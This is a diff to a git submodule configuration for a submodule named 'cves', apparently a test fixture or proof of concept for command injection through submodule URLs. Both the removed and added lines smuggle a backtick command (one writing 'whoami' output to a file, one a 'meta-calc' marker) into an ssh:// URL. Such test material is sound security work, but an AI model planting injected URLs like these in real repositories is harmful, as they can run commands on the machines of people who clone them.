@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`exec whoami>123.txt`foo.example.com/bar
+	url = ssh://`meta-calc`foo.example.com/bar
